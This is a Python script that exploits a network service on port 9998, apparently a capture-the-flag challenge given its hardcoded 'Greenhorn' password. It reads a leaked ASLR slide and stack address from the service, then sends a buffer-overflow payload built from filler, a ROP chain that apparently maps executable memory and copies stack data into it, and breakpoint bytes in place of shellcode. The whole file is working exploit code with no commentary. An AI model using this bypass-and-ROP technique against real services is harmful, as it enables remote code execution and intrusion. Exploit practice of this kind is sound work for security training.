#!/usr/bin/env python

import os
import sys
import socket
import struct

s = socket.socket()
s.connect((sys.argv[1], 9998))

print sys.stdin.readline()

print s.recv(1024)
s.send("GreenhornSecretPassword!!!\n")

print s.recv(1024)
print s.recv(1024)

s.send("A\n")

print s.recv(1024)
slide = s.recv(1024)
print slide

aslr = slide[slide.find("ASLR slide is:") + 15:]
aslr = int(aslr[:10], 16)

stack = slide[slide.find("slide variable is stored at: ") + 29:]
stack = int(stack[:10], 16)

s.send("V\n")

print s.recv(1024)

boom  = "WSAC"
boom += "aaaa"
boom += "aaaa"
boom += "aaaa"
boom += "8NIW"

boom += "a" * 1000

boom += "1111"
boom += "2222"

boom += struct.pack("I", 0x004011C0 + aslr)
boom += struct.pack("I", 0x0040199E + aslr)
boom += struct.pack("I", 0x60000000)
boom += struct.pack("I", 0x1000)
boom += struct.pack("I", 0x40)
boom += struct.pack("I", stack)
boom += struct.pack("I", 0x04011F0 + aslr)
boom += struct.pack("I", 0x00401141 + aslr)
boom += struct.pack("I", 0x60000000)
boom += struct.pack("I", stack + 0x60)
boom += struct.pack("I", 0x1000)
boom += "7777"
boom += "8888"
boom += "9999"
boom += "4444"
boom += struct.pack("I", 0x04011F0 + aslr)
boom += "5555"
boom += "6666"
boom += "7777"
boom += "8888"
boom += "9999"

boom += "\xcc" * 300

s.send(boom + '\n')

print s.recv(1024)
